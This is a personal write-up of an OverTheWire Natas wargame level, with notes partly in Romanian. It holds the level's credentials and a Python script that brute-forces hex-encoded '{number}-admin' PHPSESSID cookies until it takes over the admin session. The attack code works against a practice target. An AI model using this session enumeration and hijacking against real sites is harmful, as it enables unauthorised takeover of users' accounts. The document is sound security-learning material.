
# General info

Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
URL:      http://natas19.natas.labs.overthewire.org

# Special code section

```py
import requests
import random

def convert(s: str):
    result=""
    pairs = [s[i] + s[i+1] for i in range(0, len(s), 2)]
    for p in pairs:
        result += chr(int(p, 16))
    return result

def convert_into(username:str, number: str):
    s = number + "-" + username
    s = [i.encode().hex() for i in s]
    return "".join(s)



# with open("dictionary.txt", "r") as fin:
#     lines = [line.strip() for line in fin.readlines()]


for i in range(0, 641):
    if i % 10 == 0:
        print(f"Currently at {i} ...")
    
    # username = f"{random.choice(lines)}"
    # password = f"{random.choice(lines)}"

    session_id = convert_into("admin", str(i))

    response = requests.post(
        url="http://natas19.natas.labs.overthewire.org/index.php",
        auth=("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"),
        cookies={
            # "PHPSESSID" : f"{i}"
            # "PHPSESSID" : "243"
            "PHPSESSID" : session_id
        },
        params={
            "debug" : "sa fie"
        },
        # data={
        #     "username": username,    # fara astea nu merge
        #     "password": password
        # }
    )
    # print(response.text)
    # print(response.headers)
    # expr = response.cookies.get_dict()["PHPSESSID"]
    # print(f"Got session ID {expr}")
    # expr = convert(expr)
    # print(f"[{i}] For {username}:{password} '{expr}'")

    if not "You are logged in as a regular user" in response.text:
        print(i)
        print(response.text)
        break
    elif i % 10 == 0:
        print("However, the response still looks like it tried to login.")

# d,d -> 33352d64
# d,e -> 33332d64
# a,a -> 3632332d61
# a,b -> 3334302d61

# A,A -> 37302d41   -> 70-A

# {random id}-{username}

# daca trimit session ID-ul, nu mai am nevoie de username/password
```


Practic, a trebuit sa ma uit la SESSION ID-urile returnate
ele erau in HEX

convertindu-le in ASCII strings, mi am dat seama ca aveam un tipar de `{random id}-{username}`
am incercat dupa mai multe combinatii de usernames cu acele random ids: `natas` / `natas19` / `natas20` / `admin`
ultima a functionat, iar la `281-admin` am reusit sa fac highjack la sesiune!!